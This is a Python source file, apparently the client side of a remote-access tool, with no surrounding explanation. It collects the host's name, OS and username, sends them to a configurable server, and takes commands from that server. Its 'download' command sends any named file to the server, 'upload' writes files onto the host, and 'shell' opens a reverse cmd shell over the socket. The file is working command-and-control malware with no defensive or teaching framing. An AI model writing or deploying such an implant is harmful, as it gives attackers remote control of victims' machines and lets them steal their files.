# Agent script

import socket,time
import platform
import getpass
import subprocess, threading

def enume():
    hostname = socket.gethostname()
    OSver = platform.platform()
    username = getpass.getuser()

    return {'hostname':hostname, 'OS':OSver, 'username':username}

SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5050

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

s.send(str(enume()).encode())

print("[+] Connected to server")

def download(from_):
    from_ = s.recv(1024).decode()
    file = open(from_, 'rb')
    a = file.read(4096)
    while a:
        s.send(a)
        a = file.read(4096)
    time.sleep(0.3)
    s.send(b"\n\r")
    file.close()

def upload():
    path = s.recv(4096).decode()
    if not path.endswith('\\'):
        path += '\\'
    file_name = s.recv(4096).decode()
    path += file_name
    file = open(path, 'ab')
    a = s.recv(4096)
    while a != b"\n\r":
        file.write(a)
        a = s.recv(4096)
    file.close()
    print("File sent succesfully!")

def rev_shell(socket):
    

    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if data == 'exit':
                s.close()
                break
            if len(data) > 0 :
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))

    s = socket

    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

while 1:
    command = s.recv(409600).decode()
    print(command)
    command = command.split()

    match command[0]:
        case 'download':
            download(from_= command[1])
        case 'upload':
            upload()
        case 'shell':
            print("line 93")
            time.sleep(1)
            rev_shell(socket=s)



